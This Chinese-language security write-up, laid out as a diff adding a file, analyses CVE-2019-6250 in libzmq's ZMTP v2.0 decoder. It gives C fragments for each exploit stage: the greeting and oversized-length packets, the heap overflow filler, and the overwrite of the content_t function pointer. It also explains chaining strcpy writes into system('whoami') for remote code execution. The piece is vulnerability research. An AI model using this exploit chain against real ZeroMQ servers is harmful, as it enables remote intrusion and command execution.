@@ -1,0 +1,281 @@
+作者：中兴沉烽实验室_流光奕然
+
+## 0x01 漏洞简介
+
+### 漏洞背景
+
+ZeroMQ的核心库libzmq（4.2.x以及4.3.1之后的4.3.x）定义的ZMTP
+v2.0协议存在一个高危安全漏洞CVE-2019-6250，利用该漏洞可造成服务端远程代码执行。
+
+该漏洞NVD评分向量为CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，最终得分为8.8分。
+
+### 漏洞成因
+
+客户端和服务端使用ZMTP
+v2.0协议进行通信时，服务端接收报文后进入zmq::stream_engine_t::in_even函数，调用src/decode.hpp文件中的decode函数进行解码。
+
+v2_decoder.cpp源文件解码器的zmq::v2_decoder_t
+::size_ready方法中存在一个整形溢出问题，攻击者可以通过构造payload造成缓冲区写越界，程序的内存布局允许攻击者将操作系统命令注入到发生写越界的缓冲区后面的结构体中，从而造成任意代码执行（即不必使用改变控制流的典型缓冲区溢出攻击技术）。
+
+## 0x02 ZeroMQ及ZTMP协议简介
+
+ZeroMQ是一种基于消息队列的多线程网络库，其对套接字类型、连接处理、帧、甚至路由的底层细节进行抽象，提供跨越多种传输协议的套接字。
+
+ZeroMQ套接字提供异步消息队列、多种消息传递模式、消息过滤（订阅）、对多种传输协议的无缝访问等的抽象。常用模式有：Request-Reply，Publish-Subscribe，Parallel Pipeline。
+
+![image](https://image.3001.net/images/20210129/1611883010_601362029f9fb296066ef.png!small)
+
+ZMTP消息传输协议是ZeroMQ使用的传输层协议，用于在两个对等方之间通过连接的传输层（如TCP）交换消息。
+
+## 0x03 漏洞调试
+
+漏洞位于ZMTP协议的v2.0版本，首先client端建立tcp连接后向server端发送greeting报文进行版本协商。
+
+    
+    
+    const uint8_t greeting[] = {
+       0xFF, /* 在receive_greeting函数中标识该报文为非1.0版本 */
+       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* 未使用 */
+       0x01, /* receive_greeting函数中标识该报文为非1.0版本 */
+       0x01, /* 在select_handshake_fun函数中选择ZMTP 2.0版本 */
+       0x00, /* Unused */
+    };
+    
+    send(s, greeting, sizeof(greeting), 0);
+    
+
+![image](https://image.3001.net/images/20210129/1611883067_6013623b2fe993a969e4b.jpg!small)
+
+server端接收到greeting报文后，在src/stream_engine.cpp中的zmq::stream_engine_t::in_event()方法中进入get_buffer()方法，该方法主要是返回一个可以读取数据的内存指针，以及内存的大小。
+
+截下来程序在get_buffer()中使用src/decoder_allocators.cpp中的allocate()方法调用std::malloc，分配一块大小为allocationsize的缓冲区_buf。动态调试中_buf指向的地址为0x7ffff000bf00。
+
+    
+    
+    unsigned char *zmq::shared_message_memory_allocator::allocate ()
+    {
+      if (_buf) {
+        zmq::atomic_counter_t *c =
+          reinterpret_cast<zmq::atomic_counter_t *> (_buf);
+        if (c->sub (1)) {
+          release ();
+        }
+      }
+    
+      if (!_buf) {
+        std::size_t const allocationsize =
+          _max_size + sizeof (zmq::atomic_counter_t)
+          + _max_counters * sizeof (zmq::msg_t::content_t);
+        _buf = static_cast<unsigned char *> (std::malloc (allocationsize));
+        alloc_assert (_buf);
+        new (_buf) atomic_counter_t (1);
+      } else {
+        zmq::atomic_counter_t *c =
+          reinterpret_cast<zmq::atomic_counter_t *> (_buf);
+        c->set (1);
+      }
+    
+      _buf_size = _max_size;
+      _msg_content = reinterpret_cast<zmq::msg_t::content_t *> (
+        _buf + sizeof (atomic_counter_t) + _max_size);
+      return _buf + sizeof (zmq::atomic_counter_t);
+    }
+    
+
+分配空间成功后，msg_content指针将指向buf+0x2008偏移的内存地址0x7ffff000df08，该空间用于存放一个content_t的结构体。打印content_t可看到结构体包含了data、size、ffn、hint、refcnt5个变量。
+
+![image](https://image.3001.net/images/20210129/1611883090_6013625215e9639f13177.jpg!small)
+
+接下client端发送msg_size报文给server。报文格式为0x02+msg_size。0x02字节为消息类型标识位，msg_size为8字节的数据，用来标识接下来server端待接收消息的大小。
+
+    
+    
+    const uint8_t v2msg[] = {
+        0x02, /* 标识程序进入eight_byte_size_ready状态 */
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* msg_size */
+    };
+    send(s, v2msg, sizeof(v2msg), 0);
+    
+
+![image](https://image.3001.net/images/20210129/1611883103_6013625f1d23a27f95206.jpg!small)
+
+server端接收msg_size报文后，调用src/decoder.hpp中的decode()方法对报文进行解析。此时的函数调用堆栈即参数如下。
+
+![image](https://image.3001.net/images/20210129/1611883114_6013626a5e51e50618f94.jpg!small)
+
+decode()中初始的状态机为flags_ready，在此状态机中程序会根据消息标识通过next_step()方法跳转到其他状态机中。标识字节为0x02代表large_flag，下一步将跳转到eight_byte_size_ready状态对数据进行处理。
+
+    
+    
+    enum
+    {
+        more_flag = 1,
+        large_flag = 2,
+        command_flag = 4
+    };
+    
+    void next_step (void *read_pos_, std::size_t to_read_, step_t next_)
+    {
+        _read_pos = static_cast<unsigned char *> (read_pos_);
+        _to_read = to_read_;
+        _next = next_;
+    }
+    
+    int zmq::v2_decoder_t::flags_ready (unsigned char const *)
+    {
+      _msg_flags = 0;
+      if (_tmpbuf[0] & v2_protocol_t::more_flag)
+        _msg_flags |= msg_t::more;
+    
+      if (_tmpbuf[0] & v2_protocol_t::command_flag)
+        _msg_flags |= msg_t::command;
+    
+      if (_tmpbuf[0] & v2_protocol_t::large_flag)
+        next_step (_tmpbuf, 8, &v2_decoder_t::eight_byte_size_ready);
+      else
+        next_step (_tmpbuf, 1, &v2_decoder_t::one_byte_size_ready);
+    
+      return 0;
+    }
+    
+
+![image](https://image.3001.net/images/20210129/1611883130_6013627a9774f9ce0f2da.jpg!small)
+
+进入eight_byte_size_ready状态后会调用zmq::v2_decoder_t::size_ready方法解析消息。
+
+此时的调用堆栈即参数如下。
+
+![image](https://image.3001.net/images/20210129/1611883143_60136287b86974ef662da.jpg!small)
+
+zmq::v2_decoder_t::size_ready方法在做比较判断的时候，使用的read_pos_ +
+msg_size加法发生整型溢出，导致可绕过缓冲区大小校验进入else流程。else流程调用zmq::msg_t::init()方法，该方法不会重新分配缓冲区大小而直接处理数据。在后续流程中将造成缓冲区写越界。
+
+    
+    
+    if (unlikely (!_zero_copy
+        || ((unsigned char *) read_pos_ + msg_size_
+          > (allocator.data () + allocator.size ())))) {
+        rc = _in_progress.init_size (static_cast<size_t> (msg_size_));
+    } else {
+        rc = _in_progress.init (const_cast<unsigned char *> (read_pos_),
+                  static_cast<size_t> (msg_size_),
+                  shared_message_memory_allocator::call_dec_ref,
+                  allocator.buffer (), allocator.provide_content ());
+        if (_in_progress.is_zcmsg ()) {
+          allocator.advance_content ();
+          allocator.inc_ref ();
+        }
+    }
+    
+
+在zmq::msg_t::init()方法中，将生成_u.zclmsg结构体。该结构体的content指针被赋值为greeting报文处理流程中分配的缓冲区指针msg_content，复现环境该指针指向的地址值为0x7ffff000df08。
+
+_u.zclmsg.content指针指向的结构体中，ffn变量为函数指针，指向相关析构函数，data和hint变量分别为析构函数ffn函数的两个参数地址值。ffn将在tcp连接关闭的时候被zmq::msg_t::close()方法调用。
+
+![image](https://image.3001.net/images/20210129/1611883169_601362a1ef10f9a126542.jpg!small)
+
+![image](https://image.3001.net/images/20210129/1611883181_601362ad9f91816eba9a6.jpg!small)
+
+client端发送payload1，通过写越界进行缓冲区填充，报文长度为8183，即十六进制0x1FF7。
+
+    
+    
+    size_t plsize = 8183;
+    uint8_t* pl = (uint8_t*)calloc(1, plsize);
+    memset(pl,'a',plsize);
+    send(s, pl, plsize, 0);
+    free(pl);
+    
+
+用于接收数据的缓冲区的内存地址为0x7f84c400bf11。
+
+![image](https://image.3001.net/images/20210129/1611883193_601362b9cb20ee2e8a21a.jpg!small)
+
+zmq::stream_engine_t::in_event()方法中调用tcp_read()进行recv数据读取。读取造成内存写越界，将0x7f84c400bf11到0x7f84c400df08的内存被覆盖成0x61（’a’
+ASCII值）。
+
+![image](https://image.3001.net/images/20210129/1611883207_601362c75d83bd687714e.jpg!small)
+
+![image](https://image.3001.net/images/20210129/1611883249_601362f1863a92c958b0e.png!small)
+
+发送payload2，覆盖zmq::msg_t::content_t结构体中的ffn、data、hint三个指针变量。
+
+    
+    
+    uint8_t content_t_replacement[] = {
+       /* ffn参数一data地址，通过写溢出替换成其他参数 */
+       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    
+       /* size_t size  未使用 */
+       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    
+       /* ffn 函数指针地址，通过写溢出替换成其他函数 */
+       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    
+       /* ffn参数二hint地址，通过写溢出替换成其他参数 */
+       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    };
+    
+    /* 使用memcpy()进行数据替换 */
+    memcpy(content_t_replacement + 0, &arg1Addr, sizeof(arg1Addr));
+    memcpy(content_t_replacement + 16, &funcAddr, sizeof(funcAddr));
+    memcpy(content_t_replacement + 24, &arg2Addr, sizeof(arg2Addr));
+    
+    /* 发送报文并覆盖 zmq::msg_t::content_t结构体 */
+    send(s, content_t_replacement, sizeof(content_t_replacement), 0);
+    
+
+![image](https://image.3001.net/images/20210129/1611883264_60136300345a92c8b4f05.jpg!small)
+
+server收到payload2报文后，再次在zmq::stream_engine_t::in_event()中调用tcp_read()进行recv数据读取。溢出写入的内存地址为0x7f84c400df08，即_u.zclmsg.content结构体的地址。写入后可控制_u.lmsg.content->ffn、_u.lmsg.content->data、_u.lmsg.content->hint三个指针变量。
+
+溢出写入后打印0x7f84c400df08中的数据如下。
+
+![image](https://image.3001.net/images/20210129/1611883278_6013630e4b62dee6e87be.jpg!small)
+
+打印_u.zclmsg.content，各变量值如下。
+
+![image](https://image.3001.net/images/20210129/1611883288_60136318cc3df21e28867.jpg!small)
+
+最后client执行close()方法关闭连接时，会触发server端的zmq::msg_t::close()方法。该方法将通过_u.lmsg.content->ffn函数指针调用析构函数。相关代码逻辑如下:
+
+    
+    
+    if (is_zcmsg ()) {
+        zmq_assert (_u.zclmsg.content->ffn);
+        if (!(_u.zclmsg.flags & msg_t::shared)
+            || !_u.zclmsg.content->refcnt.sub (1)) {
+            _u.zclmsg.content->refcnt.~atomic_counter_t ();
+            _u.zclmsg.content->ffn (_u.zclmsg.content->data,
+              _u.zclmsg.content->hint);
+        }
+    }
+    
+
+到此攻击者可以通过client端发送报文进行溢出攻击得到了执行内存中任意函数的权限。
+
+## 0x04 漏洞利用及复现
+
+将ffn设置为strcpy()的地址，将第一个参数设置为可执行文件的.data节中的某个位置，将第二个参数设置为要写入的字符的地址，后跟一个空字符。
+
+例如，如果想写一个'w'字符，需要在二进制文件中搜索'w\x00'的出现地址，并使用这个地址作为strcpy调用的第二个参数。
+
+对于要在远程计算机上执行的命令的每个字符，可以分别请求将该字符写入.data部分。
+
+例如想执行whoami，我首先写'w'，然后写'h'，然后写'o'，依此类推，直到完整的''字符串写入.data。
+
+在最后一个请求中，用.data节的地址覆盖struct
+content的data成员（即whoami所在的位置），将ffn成员设置为libc中system函数的地址，并将hint设置为NULL。
+
+最终将调用system（"whoami"），通过它在远程机器上执行此命令。
+
+搭建环境进行复现poc，效果如下。
+
+![image](https://image.3001.net/images/20210129/1611883305_60136329a351be7aa968f.jpg!small)
+
+抓取报文交互如下。
+
+![image](https://image.3001.net/images/20210129/1611883318_6013633613568571a02be.jpg!small)
+
+作者：中兴沉烽实验室_流光奕然
+
